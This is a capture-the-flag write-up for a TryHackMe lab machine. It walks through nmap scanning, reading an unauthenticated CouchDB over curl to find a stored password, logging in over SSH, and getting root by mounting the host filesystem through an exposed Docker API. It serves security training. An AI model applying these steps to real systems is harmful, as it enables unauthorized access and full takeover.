https://tryhackme.com/room/couch

#Enumeration

open ports

```nmap 10.10.115.64
Open 10.10.115.64:22
Open 10.10.115.64:5984
```
#Version scan
```nmap -sC -sV -p22,5984 10.10.115.64
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXnGZUnLWqLZb8VQiVH0z85lV+G4KY5l5kKf1fS7YgSnfZ+k3CRjAZPuGceg5RQEUbOMCm+0u4SDyIEbwwAXGv0ORK4/VEIyJlZmtlqeyASwR8ML4yjdGqinqOUZ3jN/ZIg4veJ02nr86GZP+Nto0TZt7beaIxykMEZHTdo0CctdKLIet7PpvwG4F5Tn9MBoys9pUjfpcnwbf91Tv6i56Gipo07jKgb5vP8Nl1TXPjWB93WNW2vWEQ1J4tiyZlBeLOaNaEbxvNQFnKxjVYiiLCbcofwSdrwZ7/+sIy5BdiNW+k81rBN3OqaQNZ8urFaiXXf/ukRr/hhjY5a6m0MHn
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNTR07g3p8MfnQVnv8uqj8GGDH6VoSRzwRFflMbEf3WspsYyVipg6vtNQMaq5uNGUXF8ubpsnHeJA+T3RilTLXc=
|   256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLUyz2Tpwc5qPuFxV+HnGBeqLC6NWrmpmGmE0hk7Hlj
5984/tcp open  http    syn-ack ttl 60 CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-favicon: Unknown favicon MD5: 2AB2AAE806E8393B70970B2EAACE82E0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
#Intial access
we saw a couchdb of 1.6.1 version which seems latest version 

checking on couchdb website on port 5984

```curl
                                                                                                                      
┌──(root💀pc)-[/thm/Couch]
└─# curl http://10.10.11.227:5984/                                                                                7 ⨯
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}

```


```curl
┌──(root💀pc)-[/thm/Couch]
└─# curl -XGET http://10.10.11.227:5984/_all_dbs                                                               
["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]

```
we got couch, secret, test_suite_db, test_suite_db2, databses

Lets try to access it

checking couch database
```curl
┌──(root💀pc)-[/thm/Couch]
└─# curl -XGET http://10.10.11.227:5984/couch/_all_docs
{"total_rows":1,"offset":0,"rows":[
{"id":"f0bb09beb50bf8371c63ee04e100000d","key":"f0bb09beb50bf8371c63ee04e100000d","value":{"rev":"2-9f158e0d83fd380791272869372d90cd"}}
]}
               
```
accessing couch database with id "f0bb09beb50bf8371c63ee04e100000d"

```curl 
┌──(root💀pc)-[/thm/Couch]
└─# curl -XGET http://10.10.11.227:5984/couch/f0bb09beb50bf8371c63ee04e100000d
{"_id":"f0bb09beb50bf8371c63ee04e100000d","_rev":"2-9f158e0d83fd380791272869372d90cd","unnamed":null}
      
```
we don't have anything intresting lets move to another database Secret

checking secret database
```curl
┌──(root💀pc)-[/thm/Couch]
└─# curl -XGET http://10.10.11.227:5984/secret/_all_docs 
{"total_rows":1,"offset":0,"rows":[
{"id":"a1320dd69fb4570d0a3d26df4e000be7","key":"a1320dd69fb4570d0a3d26df4e000be7","value":{"rev":"2-57b28bd986d343cacd9cb3fca0b20c46"}}
]}
             
```

accessing secret database

```curl
┌──(root💀pc)-[/thm/Couch]
└─# curl -XGET http://10.10.11.227:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:<password hidden>"}
                                                                                                                      
```
we got username and password 
i.e.., atena:<password hidden>

Lets try to ssh into the machine

```ssh
┌──(root💀pc)-[/thm/Couch]
└─# ssh atena@10.10.11.227
atena@10.10.11.227's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Wed Jun 30 23:01:24 2021 from 10.17.5.228
atena@ubuntu:~$ 
```

we got access with those credentials

Lets get th user.txt flag

```user.txt
atena@ubuntu:~$ cat user.txt 
THM{*********}
```

#Privilage escalation

```cat /home/atena/.bash_history
<READIACTED>
docker images
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
exit
```
#Getting Root shell

```docker
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # 
```

getting root flag


```cat /mnt/root/root.txt
THM{*******}

```
© 2021 GitHub, Inc.
Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About
